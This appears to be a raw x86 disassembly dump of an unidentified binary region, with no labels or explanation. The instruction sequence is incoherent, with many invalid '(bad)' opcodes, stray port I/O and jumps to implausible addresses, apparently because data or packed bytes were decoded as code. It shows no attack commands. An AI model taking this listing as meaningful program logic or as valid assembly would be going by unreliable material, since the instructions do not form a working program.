  40fab8:	mov    ?,esp
  40faba:	sub    BYTE PTR [eax-0xb],0xf2
  40fabe:	sbb    al,0x67
  40fac0:	or     eax,0xde0b9861
  40fac5:	jns    0x40fb1a
  40fac7:	push   ecx
  40fac8:	adc    BYTE PTR [edx],ah
  40faca:	imul   edx,esp,0xfffffff0
  40facd:	scas   eax,DWORD PTR es:[edi]
  40face:	fcos   
  40fad0:	xchg   edx,eax
  40fad1:	sbb    edx,DWORD PTR [ebx-0x1c]
  40fad4:	adc    al,0x9b
  40fad6:	push   ss
  40fad7:	mov    dl,0x5b
  40fad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fada:	or     al,0xa1
  40fadc:	cmp    edi,DWORD PTR [edi-0xa]
  40fadf:	dec    eax
  40fae0:	test   eax,0xd93c8a98
  40fae5:	mov    bl,0x43
  40fae7:	add    al,0x97
  40fae9:	jo     0x40fa92
  40faeb:	cwde   
  40faec:	cli    
  40faed:	sbb    ah,ch
  40faef:	mov    ds:0xe269a379,eax
  40faf4:	inc    edi
  40faf5:	xor    al,0x3f
  40faf7:	pop    esi
  40faf8:	in     eax,0x43
  40fafa:	adc    ah,BYTE PTR [ebx+eax*8+0x5bb9c73a]
  40fb01:	fcmovb st,st(5)
  40fb03:	retf   0x502f
  40fb06:	adc    al,0xcc
  40fb08:	push   ecx
  40fb09:	pop    esp
  40fb0a:	ret    0x1743
  40fb0d:	mov    bh,BYTE PTR [eax-0x14e102b9]
  40fb13:	mov    cl,0x7e
  40fb15:	fmul   DWORD PTR [eax]
  40fb17:	push   eax
  40fb18:	sbb    al,0x55
  40fb1a:	mov    ds:0x88b1d722,al
  40fb1f:	and    DWORD PTR [esi],edi
  40fb21:	cmp    BYTE PTR [ebx],bh
  40fb23:	fild   WORD PTR [edx]
  40fb25:	inc    ebp
  40fb26:	ss pop esp
  40fb28:	jg     0x40fb52
  40fb2a:	jmp    0x40fb75
  40fb2c:	or     dl,dl
  40fb2e:	mov    dl,0x17
  40fb30:	add    al,0x7d
  40fb32:	shl    BYTE PTR [edi-0x6f],cl
  40fb35:	dec    edi
  40fb36:	loopne 0x40fb79
  40fb38:	(bad)  [esi-0x64db2d8a]
  40fb3e:	mov    ebp,0x73ec2c84
  40fb43:	lods   al,BYTE PTR ds:[esi]
  40fb44:	dec    edi
  40fb45:	push   ebx
  40fb46:	fistp  DWORD PTR [edx-0x5489c2b3]
  40fb4c:	scas   al,BYTE PTR es:[edi]
  40fb4d:	or     ebx,DWORD PTR [ebx-0x67]
  40fb50:	(bad)  
  40fb52:	cld    
  40fb53:	leave  
  40fb54:	cmp    ebp,edx
  40fb56:	(bad)  
  40fb57:	and    BYTE PTR [ecx-0x3ecfd650],dh
  40fb5d:	or     DWORD PTR [esi],ecx
  40fb5f:	sub    eax,DWORD PTR [edi+edi*1+0x79]
  40fb63:	sbb    DWORD PTR [eax],ecx
  40fb65:	jo     0x40fb48
  40fb67:	cmp    eax,DWORD PTR [ecx+ecx*1+0x4a8890b9]
  40fb6e:	mov    ds:0xeddd4b4e,al
  40fb73:	addr16 aam 0x37
  40fb76:	jo     0x40fbe0
  40fb78:	push   ds
  40fb79:	and    eax,0x29827e9b
  40fb7e:	aam    0x90
  40fb80:	addr16 push ebx
  40fb82:	sub    esp,DWORD PTR [ebp-0x25f4c3fb]
  40fb88:	adc    ebp,ebp
  40fb8a:	adc    DWORD PTR [ebx+0x5c],0x7fb26e42
  40fb91:	xor    DWORD PTR [esi],eax
  40fb93:	mov    bh,0x2
  40fb95:	retf   
  40fb96:	popa   
  40fb97:	stos   BYTE PTR es:[edi],al
  40fb98:	std    
  40fb99:	or     BYTE PTR [ecx-0x79],dl
  40fb9c:	pushf  
  40fb9d:	aaa    
  40fb9e:	xchg   DWORD PTR [ebp-0x135019e3],edx
  40fba4:	out    dx,eax
  40fba5:	jp     0x40fba2
  40fba7:	shr    ch,cl
  40fba9:	stos   BYTE PTR es:[edi],al
  40fbaa:	popa   
  40fbab:	mov    esp,DWORD PTR [eax]
  40fbad:	or     al,0x1d
  40fbaf:	mov    ebx,edi
  40fbb1:	cmp    bl,ch
  40fbb3:	and    BYTE PTR ds:[ebp+0x5d57f82e],dh
  40fbba:	mov    ax,ds:0x23544c65
  40fbc0:	jl     0x40fc35
  40fbc2:	adc    eax,0xcadd613c
  40fbc7:	fidiv  DWORD PTR [ecx+0x30]
  40fbca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbcb:	add    ecx,ebx
  40fbcd:	sbb    BYTE PTR [ebx-0x3],bh
  40fbd0:	and    eax,0xb9aba3a4
  40fbd5:	(bad)  
  40fbd6:	mov    edx,0x813f40cb
  40fbdb:	loop   0x40fb9e
  40fbdd:	les    ebx,FWORD PTR [edi-0x31]
  40fbe0:	and    al,0x74
  40fbe2:	dec    edi
  40fbe3:	adc    bl,BYTE PTR [esi]
  40fbe5:	outs   dx,BYTE PTR ds:[esi]
  40fbe6:	pop    esi
  40fbe7:	in     eax,dx
  40fbe8:	mov    ecx,0xbb2c82f0
  40fbee:	call   FWORD PTR [edx-0x2d]
  40fbf1:	cmp    BYTE PTR [ebp+0x20],ch
  40fbf4:	imul   ecx,DWORD PTR ds:0x13b8b33d,0x59791d11
  40fbfe:	into   
  40fbff:	add    ah,BYTE PTR [ebp-0x30]
  40fc02:	pop    ecx
  40fc03:	dec    eax
  40fc04:	dec    ebx
  40fc05:	in     eax,0x44
  40fc07:	stos   DWORD PTR es:[edi],eax
  40fc08:	sub    esi,DWORD PTR [ebp-0x48db9d94]
  40fc0e:	sub    esi,DWORD PTR [ebx+esi*8-0xd]
  40fc12:	jge    0x40fc17
  40fc14:	out    dx,eax
  40fc15:	lock into 
  40fc17:	dec    ebx
  40fc18:	aad    0xbd
  40fc1a:	ror    DWORD PTR [ecx+0x1e061191],0x6d
  40fc21:	test   BYTE PTR [edi-0x50],bl
  40fc24:	loop   0x40fc3e
  40fc26:	mov    DWORD PTR [eax-0x741b9372],ebx
  40fc2c:	or     bl,bl
  40fc2e:	lahf   
  40fc2f:	nop
  40fc30:	or     al,BYTE PTR [eax]
  40fc32:	mov    al,ds:0x673fe2ee
  40fc37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc39:	cmp    eax,0x316037cc
  40fc3e:	and    BYTE PTR [edi],cl
  40fc40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc41:	out    0x50,eax
  40fc43:	xchg   esi,eax
  40fc44:	mov    eax,ds:0xa412334
  40fc49:	(bad)  
  40fc4a:	jmp    0xb31c:0x2bb99095
  40fc51:	xchg   esi,eax
  40fc52:	std    
  40fc53:	inc    edx
  40fc54:	loopne 0x40fbe4
  40fc56:	out    dx,al
  40fc57:	rcr    cl,0x48
  40fc5a:	rcr    BYTE PTR [esi-0x79],cl
  40fc5d:	add    edx,DWORD PTR [edi]
  40fc5f:	(bad)  
  40fc60:	fmul   QWORD PTR [esp+ebp*4]
  40fc63:	das    
  40fc64:	inc    esp
  40fc65:	pop    edi
  40fc66:	call   0x39cead57
  40fc6b:	stos   DWORD PTR es:[edi],eax
  40fc6c:	xor    ebp,DWORD PTR [ebx+0x74]
  40fc6f:	jo     0x40fc06
  40fc71:	mov    edi,0xb069798c
  40fc76:	int    0x9b
  40fc78:	jl     0x40fcd2
  40fc7a:	pop    edx
  40fc7b:	fbld   TBYTE PTR [edi-0x55ee7139]
  40fc81:	outs   dx,DWORD PTR ds:[esi]
  40fc82:	dec    eax
  40fc83:	xchg   edi,eax
  40fc84:	add    bl,bh
  40fc86:	push   0xfffffffa
  40fc88:	dec    ebx
  40fc89:	sub    al,0x5d
  40fc8b:	jnp    0x40fce3
  40fc8d:	pop    esp
  40fc8e:	lock daa 
  40fc90:	stos   BYTE PTR es:[edi],al
  40fc91:	sar    DWORD PTR [edi-0x76887ddf],1
  40fc97:	xchg   esi,eax
  40fc98:	(bad)  
  40fc99:	test   al,0x42
  40fc9b:	pop    ebp
  40fc9c:	or     DWORD PTR [ebx-0x42625ab7],ebx
  40fca2:	mov    eax,0xbf45f006
  40fca7:	and    BYTE PTR [ecx-0x35],0xe1
  40fcab:	pop    ebp
  40fcac:	mov    bh,BYTE PTR [edi]
  40fcae:	jo     0x40fc90
  40fcb0:	push   esi
  40fcb1:	adc    eax,0x67d82f39
  40fcb6:	(bad)  
  40fcb7:	cmc    
  40fcb8:	pushf  
  40fcb9:	pop    esi
  40fcba:	mov    ebp,0xd9ecc3aa
  40fcbf:	call   0x52e1a0ba
  40fcc4:	cmp    eax,0x7b6c61aa
  40fcc9:	mov    dl,0x95
  40fccb:	les    esp,FWORD PTR [ecx]
  40fccd:	out    0xe0,eax
  40fccf:	cs popf 
  40fcd1:	repz mov edx,0xb80b9570
  40fcd7:	rcl    DWORD PTR [eax+0x4f6bb293],cl
  40fcdd:	lds    esp,FWORD PTR [ebx+0x143ffd9d]
  40fce3:	push   esp
  40fce4:	sahf   
  40fce5:	leave  
  40fce6:	mov    dl,0x90
  40fce8:	xchg   edi,eax
  40fce9:	mov    dh,0x4b
  40fceb:	je     0x40fd3d
  40fced:	dec    esp
  40fcee:	mov    eax,0xb2d152ce
  40fcf3:	js     0x40fcd0
  40fcf5:	in     al,0x81
  40fcf7:	inc    esi
  40fcf8:	pop    ecx
  40fcf9:	outs   dx,BYTE PTR ds:[esi]
  40fcfa:	push   ebx
  40fcfb:	sbb    al,0xca
  40fcfd:	mov    edx,ebp
  40fcff:	mov    edx,0x80797faa
  40fd04:	les    eax,FWORD PTR [esi+0x12aade75]
  40fd0a:	jns    0x40fcce
  40fd0c:	lods   al,BYTE PTR ds:[esi]
  40fd0d:	jae    0x40fcd3
  40fd0f:	mov    bl,0xdc
  40fd11:	push   ebp
  40fd12:	sub    eax,0x44a00d99
  40fd17:	push   esi
  40fd18:	aad    0x27
  40fd1a:	jae    0x40fcac
  40fd1c:	int    0x2e
  40fd1e:	mov    al,ds:0xc07af7c5
  40fd23:	adc    al,0x33
  40fd25:	inc    WORD PTR [eax]
  40fd28:	sub    ebx,DWORD PTR [ebp-0x6c851312]
  40fd2e:	das    
  40fd2f:	arpl   WORD PTR [esi-0x265b4d45],bp
  40fd35:	adc    ebx,DWORD PTR [ebx+0x4]
  40fd38:	or     eax,0xf8f05455
  40fd3d:	xchg   DWORD PTR [ecx+0x19],ebp
  40fd40:	push   esp
  40fd41:	xor    esi,DWORD PTR [ecx-0x67]
  40fd44:	add    ecx,DWORD PTR [ebx+0x4f]
  40fd47:	(bad)  
  40fd48:	scas   al,BYTE PTR es:[edi]
  40fd49:	jp     0x40fce5
  40fd4b:	jnp    0x40fd24
  40fd4d:	std    
  40fd4e:	xchg   edx,ecx
  40fd50:	mov    edx,0xe25805a5
  40fd55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd56:	aaa    
  40fd57:	ins    BYTE PTR es:[edi],dx
  40fd58:	push   esi
  40fd59:	mov    dl,0x28
  40fd5b:	xchg   ebp,eax
  40fd5c:	xlat   BYTE PTR ds:[ebx]
  40fd5d:	cmp    bl,bl
  40fd5f:	mov    ebx,0x8b036a8f
  40fd64:	stc    
  40fd65:	xchg   ebp,eax
  40fd66:	ret    
  40fd67:	cmp    BYTE PTR [esi+0x25645113],bl
  40fd6d:	(bad)  
  40fd6e:	aas    
  40fd6f:	call   0xcff:0xf9771a8b
  40fd76:	sub    bh,BYTE PTR [edx]
  40fd78:	mov    DWORD PTR [edi+ebx*8+0x7e0ca25b],esp
  40fd7f:	adc    cl,BYTE PTR [eax+ebp*2+0x3183de0a]
  40fd86:	add    edx,DWORD PTR [ecx+0x2a630657]
  40fd8c:	or     eax,edi
  40fd8e:	add    esi,ebx
  40fd90:	xchg   BYTE PTR [esi-0x3d],bl
  40fd93:	cli    
  40fd94:	stc    
  40fd95:	pop    ds
  40fd96:	imul   esi,DWORD PTR [edi+esi*4],0xffffff98
  40fd9a:	cmp    DWORD PTR [eax-0x1f],ecx
  40fd9d:	cli    
  40fd9e:	xor    BYTE PTR [edx-0x12],ch
  40fda1:	pusha  
  40fda2:	pop    eax
  40fda3:	fs inc DWORD PTR cs:[eax]
  40fda7:	cmp    DWORD PTR [ecx],0x485d5961
  40fdad:	ds mov dh,0x80
  40fdb0:	mov    ebp,DWORD PTR [ebx-0x285e6894]
  40fdb6:	xor    BYTE PTR [edx],bh
  40fdb8:	add    eax,0x31d22652
  40fdbd:	dec    ebx
  40fdbe:	push   ebp
  40fdbf:	rcl    DWORD PTR [esi+0x1578bc95],1
  40fdc5:	js     0x40fdf3
  40fdc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdc8:	adc    eax,0xa007a6f2
  40fdcd:	mov    WORD PTR [ecx+0x4d],es
  40fdd0:	cmp    eax,0xa0544145
  40fdd5:	hlt    
  40fdd6:	and    DWORD PTR [ecx+0x4],esi
  40fdd9:	sub    bh,al
  40fddb:	and    al,0x35
  40fddd:	bound  esi,QWORD PTR ss:[edi-0x1eb8c092]
  40fde4:	mov    edi,?
  40fde6:	fwait
  40fde7:	jge    0x40fd9b
  40fde9:	in     al,dx
  40fdea:	sub    ebx,ebp
  40fdec:	adc    al,0xd1
  40fdee:	xor    bh,BYTE PTR [ebp+0x7d]
  40fdf1:	addr16 das 
  40fdf3:	fild   QWORD PTR [ebp+0x6c]
  40fdf6:	scas   eax,DWORD PTR es:[edi]
  40fdf7:	adc    al,0x9
  40fdf9:	or     esp,ebx
  40fdfb:	mov    ah,0xdd
  40fdfd:	arpl   bp,di
  40fdff:	int3   
  40fe00:	pushf  
  40fe01:	push   0xb7c70e0
  40fe06:	add    al,0xf4
  40fe08:	leave  
  40fe09:	and    BYTE PTR [ebx-0x26ddef7e],dh
  40fe0f:	pop    edx
  40fe10:	popa   
  40fe11:	stos   BYTE PTR es:[edi],al
  40fe12:	jg     0x40fe71
  40fe14:	pop    esi
  40fe15:	mov    esi,0x4aa4604e
  40fe1a:	pusha  
  40fe1b:	data16 js 0x40fdd4
  40fe1e:	in     al,dx
  40fe1f:	sub    BYTE PTR ds:0x3a8d6601,bl
  40fe25:	or     eax,0x417de247
  40fe2a:	xchg   esi,eax
  40fe2b:	mov    bh,0xa6
  40fe2d:	sar    esp,0xa7
  40fe30:	lock ror BYTE PTR [edi+0x6b],cl
  40fe34:	jmp    0x40fe45
  40fe36:	dec    esi
  40fe37:	inc    ebp
  40fe38:	xchg   ebp,eax
  40fe39:	sub    eax,0xfb19b794
  40fe3e:	jne    0x40fe19
  40fe40:	in     eax,0xc9
  40fe42:	jne    0x40fe52
  40fe44:	mov    esp,DWORD PTR [ebp+0x18]
  40fe47:	push   ds
  40fe48:	shl    bh,1
  40fe4a:	jb     0x40fe26
  40fe4c:	mov    al,ds:0x3374ec65
  40fe51:	push   edi
  40fe52:	pop    eax
  40fe53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe54:	shl    ebx,cl
  40fe56:	shl    DWORD PTR [esi-0x72],0x46
  40fe5a:	ins    BYTE PTR es:[edi],dx
  40fe5b:	mov    eax,0x89d21335
  40fe60:	push   edx
  40fe61:	push   ebx
  40fe62:	xchg   ecx,eax
  40fe63:	mov    ah,0x12
  40fe65:	rcl    BYTE PTR [ebp+0x5d],1
  40fe68:	stos   BYTE PTR es:[edi],al
  40fe69:	jge    0x40feab
  40fe6b:	push   edi
  40fe6c:	push   esp
  40fe6d:	jl     0x40fe66
  40fe6f:	jo     0x40fed4
  40fe71:	mov    edi,0xf37411fa
  40fe76:	lds    ebp,FWORD PTR [edx+0x196313b8]
  40fe7c:	out    dx,al
  40fe7d:	inc    esp
  40fe7e:	jno    0x40fe96
  40fe80:	in     eax,0x6e
  40fe82:	jmp    0xbfaf0485
  40fe87:	int3   
  40fe88:	jmp    0x1942:0xb04336ae
  40fe8f:	outs   dx,BYTE PTR ds:[esi]
  40fe90:	mov    ebx,0x28f43d05
  40fe95:	ds and al,0x7a
  40fe98:	ficom  DWORD PTR [ecx-0x19]
  40fe9b:	or     al,0xe4
  40fe9d:	push   edx
  40fe9e:	jb     0x40fed4
  40fea0:	ins    DWORD PTR es:[edi],dx
  40fea1:	xchg   ecx,eax
  40fea2:	cdq    
  40fea3:	inc    ebp
  40fea4:	or     cl,BYTE PTR [ecx-0x56]
  40fea7:	shr    BYTE PTR [edi-0x55],cl
  40feaa:	xlat   BYTE PTR ds:[ebx]
  40feab:	cmc    
  40feac:	retf   0xd23c
  40feaf:	std    
  40feb0:	xor    eax,esi
  40feb2:	nop
  40feb3:	fst    DWORD PTR es:0x21a00a19
  40feba:	xchg   ebx,eax
  40febb:	push   ebp
  40febc:	sub    al,0x8c
  40febe:	jmp    0xb53f76f8
  40fec3:	gs (bad) 
  40fec5:	imul   ebp
  40fec7:	xor    al,0x4d
  40fec9:	dec    ebx
  40feca:	pop    esi
  40fecb:	jno    0x40feb7
  40fecd:	mov    gs:0xe49ddb1b,eax
  40fed3:	jge    0x40ff34
  40fed5:	es sti 
  40fed7:	adc    al,0x7e
  40fed9:	or     DWORD PTR [edi-0x7f191600],0xc041e762
  40fee3:	fild   QWORD PTR [ebp-0x61]
  40fee6:	cmc    
  40fee7:	clc    
  40fee8:	push   es
  40fee9:	xlat   BYTE PTR ds:[ebx]
  40feea:	aaa    
  40feeb:	fst    DWORD PTR [esi+eax*1+0x33]
  40feef:	aaa    
  40fef0:	cwde   
  40fef1:	(bad)  
  40fef2:	cmp    dh,bh
  40fef4:	xchg   edx,eax
  40fef5:	cmc    
  40fef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fef7:	lahf   
  40fef8:	test   eax,0x5c1a119b
  40fefd:	mov    ecx,0xe96d4cba
  40ff02:	pop    eax
  40ff03:	xor    eax,0xcbe40991
  40ff08:	out    dx,eax
  40ff09:	loop   0x40ff02
  40ff0b:	data16 mov al,0x12
  40ff0e:	dec    edx
  40ff0f:	fdivr  DWORD PTR ds:0x3cc599cd
  40ff15:	mov    DWORD PTR [ecx+0x38dd20d1],edx
  40ff1b:	(bad)
  40ff1e:	jge    0x40ff5e
  40ff20:	and    DWORD PTR ss:[ebx-0x2b],ecx
  40ff24:	scas   eax,DWORD PTR es:[edi]
  40ff25:	sbb    esp,DWORD PTR [eax-0x531ac7d5]
  40ff2b:	ss jnp 0x40ff96
  40ff2e:	aaa    
  40ff2f:	aaa    
  40ff30:	and    bh,BYTE PTR [ebx]
  40ff32:	dec    ecx
  40ff33:	mov    eax,ds:0x7d0f08a2
  40ff38:	push   ebp
  40ff39:	aad    0x3c
  40ff3b:	cmc    
  40ff3c:	rcr    ch,0xc0
  40ff3f:	add    dh,BYTE PTR [esi]
  40ff41:	push   edx
  40ff42:	aaa    
  40ff43:	es pop es
  40ff45:	int3   
  40ff46:	push   DWORD PTR [ebx-0x417f4e87]
  40ff4c:	in     al,dx
  40ff4d:	or     bl,BYTE PTR [esi+0x2f15139f]
  40ff53:	enter  0x5c27,0x14
  40ff57:	mov    esi,0x2c654d27
  40ff5c:	mov    ebx,0x25e90898
  40ff61:	loop   0x40ff07
  40ff63:	data16 loope 0x40ff06
  40ff66:	nop
  40ff67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff68:	ins    WORD PTR es:[edi],dx
  40ff6a:	sti    
  40ff6b:	aam    0xfe
  40ff6d:	lea    esi,[ebx-0x78]
  40ff70:	stos   DWORD PTR es:[edi],eax
  40ff71:	fs mov sp,0x3e61
  40ff76:	sub    DWORD PTR [ecx-0xe],eax
  40ff79:	adc    esp,DWORD PTR [ecx]
  40ff7b:	mov    dh,0x6d
  40ff7d:	push   ebx
  40ff7e:	push   ss
  40ff7f:	mov    BYTE PTR [ecx],cl
  40ff81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff83:	shl    ah,1
  40ff85:	xchg   DWORD PTR ds:0x8a26111c,ecx
  40ff8b:	jg     0x40ff18
  40ff8d:	adc    eax,0x3ab24d56
  40ff92:	sbb    BYTE PTR ds:0x904ec301,ch
  40ff98:	jo     0x40ffb4
  40ff9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff9b:	sbb    BYTE PTR [eax],dh
  40ff9d:	mov    esp,0xfeb0db41
  40ffa2:	sbb    eax,0x62754bb
  40ffa7:	dec    edx
  40ffa8:	mov    dl,ch
  40ffaa:	cld    
  40ffab:	aas    
  40ffac:	loop   0x40ff39
  40ffae:	pushf  
  40ffaf:	or     al,0x9f
  40ffb1:	push   0x73
  40ffb3:	xchg   ecx,eax
  40ffb4:	mov    edi,0xa0064106
  40ffb9:	aas    
  40ffba:	cmp    BYTE PTR [ebp-0x4c54a1ce],bh
  40ffc0:	hlt    
  40ffc1:	mov    esp,0x4b08d067
  40ffc6:	xchg   ebx,edx
  40ffc8:	dec    esi
  40ffc9:	cwde   
  40ffca:	pusha  
  40ffcb:	sub    ah,BYTE PTR [eax-0x38feb1cc]
  40ffd1:	cmp    DWORD PTR [eax+0x73293d9e],esi
  40ffd7:	jl     0x410042
  40ffd9:	imul   DWORD PTR [ecx+0x27]
  40ffdc:	mov    dh,0xbe
  40ffde:	and    esi,esp
  40ffe0:	sbb    al,0x86
  40ffe2:	mov    ah,0xdb
  40ffe4:	cmp    ebx,DWORD PTR [eax]
  40ffe6:	adc    al,0x56
  40ffe8:	cwde   
  40ffe9:	mov    cl,0xab
  40ffeb:	stc    
  40ffec:	inc    ebx
  40ffed:	xor    esi,DWORD PTR [edi]
  40ffef:	jecxz  0x40ffbc
  40fff1:	imul   DWORD PTR [ebx+0x52bb663]
  40fff7:	cmp    cl,BYTE PTR [edx-0x78b8a0a9]
  40fffd:	mov    ch,ah
  40ffff:	adc    ecx,edi
  410001:	pop    ds
  410002:	lods   eax,DWORD PTR ds:[esi]
  410003:	adc    eax,0xe6d3d7d6
  410008:	pop    esp
  410009:	push   es
  41000a:	add    BYTE PTR [eax+0x732c49d2],ah
  410010:	sbb    edx,ebx
  410012:	inc    edx
  410013:	cld    
  410014:	pop    es
  410015:	fs adc eax,0xd780ca04
  41001b:	lock cmp dl,BYTE PTR [esi+0x46]
  41001f:	mov    ss,WORD PTR [edx]
  410021:	xor    ecx,esi
  410023:	inc    esp
  410024:	lock out 0x27,eax
  410027:	fiadd  DWORD PTR [eax]
  410029:	inc    esi
  41002a:	ror    DWORD PTR [edi],cl
  41002c:	test   BYTE PTR [esi],al
  41002e:	cmp    DWORD PTR [esi+0x24fb4f7f],eax
  410034:	mov    bh,0x81
  410036:	xor    ch,BYTE PTR [ebx-0x7c]
  410039:	and    al,0x58
  41003b:	add    eax,0xbaf457bd
  410040:	jle    0x410029
  410042:	or     ecx,DWORD PTR [ebp-0x233a322e]
  410048:	mov    esi,0x13cc6d05
  41004d:	inc    esp
  41004e:	test   al,0xa6
  410050:	sbb    esi,DWORD PTR [ebx+0x59]
  410053:	xchg   ecx,eax
  410054:	jnp    0x410036
  410056:	adc    BYTE PTR [ebx-0x1d],ah
  410059:	imul   esp,DWORD PTR [edx-0x74eb4ad1],0xffffffc7
  410060:	(bad)  
  410061:	fdivr  st,st(0)
  410063:	pop    esi
  410064:	aad    0x6
  410066:	jg     0x4100cd
  410068:	imul   ebx
  41006a:	mov    bh,0x10
  41006c:	sbb    esp,edx
  41006e:	mov    dl,0xbf
  410070:	xchg   edi,ebx
  410072:	xchg   cl,ah
  410074:	adc    al,0x84
  410076:	xor    al,0xf9
  410078:	cmp    DWORD PTR [edi],edx
  41007a:	mov    ah,0x91
  41007c:	jmp    0x4180:0xf87c9bce
  410083:	and    ch,BYTE PTR gs:[ebx+eiz*1+0x52]
  410088:	icebp  
  410089:	xor    ch,BYTE PTR [esi+0x27]
  41008c:	out    dx,al
  41008d:	mov    eax,ds:0x20fdfa89
  410092:	mov    bl,BYTE PTR [ecx-0x18b064d]
  410098:	mov    ah,0x1c
  41009a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41009b:	test   DWORD PTR [edx],edi
  41009d:	rcr    DWORD PTR [ecx-0x1],cl
  4100a0:	inc    ecx
  4100a1:	lds    edi,FWORD PTR [edi]
  4100a3:	xchg   ebx,eax
  4100a4:	pop    ebp
  4100a5:	dec    edi
  4100a6:	sbb    eax,DWORD PTR [edx-0x2a6a958b]
  4100ac:	outs   dx,DWORD PTR ds:[esi]
  4100ad:	or     al,0xd9
  4100af:	ret    0x36ae
  4100b2:	and    DWORD PTR [edi],eax
  4100b4:	cmp    ebx,edi
  4100b6:	sahf   
  4100b7:	dec    edx
  4100b8:	add    ebx,esi
  4100ba:	aad    0x5f
  4100bc:	js     0x41004d
  4100be:	dec    esp
  4100bf:	neg    ebp
  4100c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100c2:	mov    bh,0x3f
  4100c4:	jne    0x410049
  4100c6:	je     0x41010d
  4100c8:	or     ah,al
  4100ca:	jmp    0xd36a685b
  4100cf:	push   esi
  4100d0:	mov    esi,0x72bb963
  4100d5:	mov    dl,BYTE PTR [eax+eax*1+0x11]
  4100d9:	(bad)  
  4100da:	pop    esi
  4100db:	sti    
  4100dc:	imul   ebx,edi,0x1dbe808e
  4100e2:	(bad)  
  4100e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100e4:	jecxz  0x4100ec
  4100e6:	stos   DWORD PTR es:[edi],eax
  4100e7:	loop   0x410110
  4100e9:	mov    ah,0x94
  4100eb:	ds (bad) 
  4100ed:	push   edx
  4100ee:	mov    ch,cl
  4100f0:	sahf   
  4100f1:	sar    BYTE PTR [edx],0x81
  4100f4:	scas   al,BYTE PTR es:[edi]
  4100f5:	xchg   edx,eax
  4100f6:	iret   
  4100f7:	inc    esp
  4100f8:	adc    eax,0xd325f02d
  4100fd:	fnstsw WORD PTR [eax+esi*4+0x2d]
  410101:	sbb    BYTE PTR [ebp+0x7c],0x65
  410105:	ins    BYTE PTR es:[edi],dx
  410106:	fdivr  st(6),st
  410108:	pop    esp
  410109:	dec    esi
  41010a:	cld    
  41010b:	cdq    
  41010c:	int    0x42
  41010e:	pop    ss
  41010f:	dec    ecx
  410110:	sti    
  410111:	and    esi,eax
  410113:	fisttp WORD PTR [ecx+0x30]
  410116:	pop    esi
  410117:	sar    DWORD PTR [ecx],cl
  410119:	(bad)  
  41011b:	inc    edx
  41011c:	mov    ds:0xfe5e2ebe,eax
  410121:	push   0xfffffff7
  410123:	push   0xd36b16e1
  410128:	mov    es:0x402c4419,eax
  41012e:	push   ss
  41012f:	ins    BYTE PTR es:[edi],dx
  410130:	inc    esi
  410131:	leave  
  410132:	and    DWORD PTR [esi-0x4508de90],esp
  410138:	mov    dl,0xca
  41013a:	loop   0x41015c
  41013c:	cmp    al,0xb3
  41013e:	xchg   ebp,eax
  41013f:	fs out dx,al
  410141:	cmp    BYTE PTR [edi-0x78818970],dh
  410147:	fisub  DWORD PTR [edi+0x3b]
  41014a:	add    bl,cl
  41014c:	xchg   edx,eax
  41014d:	loopne 0x4100d9
  41014f:	out    dx,al
  410150:	mov    DWORD PTR [ebx+0x5c86c2a5],0x8c5bef35
  41015a:	enter  0xc8a8,0x10
  41015e:	sub    ah,bh
  410160:	enter  0xba56,0x50
  410164:	es mov esi,0xf3269864
  41016a:	mov    bh,0x9d
  41016c:	gs loope 0x41010a
  41016f:	fcomp  QWORD PTR es:[ecx-0xf]
  410173:	and    eax,0x3c4c970c
  410178:	inc    edx
  410179:	les    esi,FWORD PTR [edi]
  41017b:	xchg   esp,eax
  41017c:	cmp    BYTE PTR [edx+0x76bd4ed4],ch
  410182:	sub    bh,BYTE PTR [edx-0x32]
  410185:	mov    cl,0x96
  410187:	lods   eax,DWORD PTR ds:[esi]
  410188:	(bad)  
  410189:	xlat   BYTE PTR ds:[ebx]
  41018a:	or     BYTE PTR [ecx+0x1b],bh
  41018d:	sbb    BYTE PTR [edx],cl
  41018f:	(bad)  
  410190:	push   edi
  410191:	clc    
  410192:	shl    bh,0xee
  410195:	sbb    al,0x4b
  410197:	mov    ecx,0x698db5af
  41019c:	jmp    0x72915236
  4101a1:	test   DWORD PTR [edi-0x7038ce31],esi
  4101a7:	or     al,0x70
  4101a9:	ds dec ebx
  4101ab:	mov    al,ds:0xed3b141e
  4101b0:	cmp    edx,esi
  4101b2:	sbb    al,0x16
  4101b4:	out    dx,al
  4101b5:	pusha  
  4101b6:	scas   al,BYTE PTR es:[edi]
  4101b7:	add    DWORD PTR [eax+esi*8],ebp
  4101ba:	fnstcw WORD PTR [edi]
  4101bc:	pop    ds
  4101bd:	xchg   ebx,eax
  4101be:	mov    ch,cl
  4101c0:	fwait
  4101c1:	xor    al,0x32
  4101c3:	push   ds
  4101c4:	xchg   ebp,eax
  4101c5:	mov    bh,0xd7
  4101c7:	ror    DWORD PTR [edi-0x33],cl
  4101ca:	or     eax,0xc72c882e
  4101cf:	popf   
  4101d0:	jnp    0x410233
  4101d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101d3:	shr    edx,1
  4101d5:	(bad)  
  4101d6:	adc    DWORD PTR [ecx-0x30302ac],esp
  4101dc:	xor    BYTE PTR [ebx-0x19],dh
  4101df:	lock xchg edx,eax
  4101e1:	cmp    ebx,0x9a5fcd63
  4101e7:	and    ah,dl
  4101e9:	dec    eax
  4101ea:	mov    al,BYTE PTR [ecx]
  4101ec:	inc    edx
  4101ed:	adc    eax,0x7ac37def
  4101f2:	mov    ds:0x6f6c10e3,al
  4101f7:	lea    ecx,[edx]
  4101f9:	mov    ds:0x34aced6e,eax
  4101fe:	mov    ch,0x1b
  410200:	push   ebx
  410201:	loopne 0x4101f0
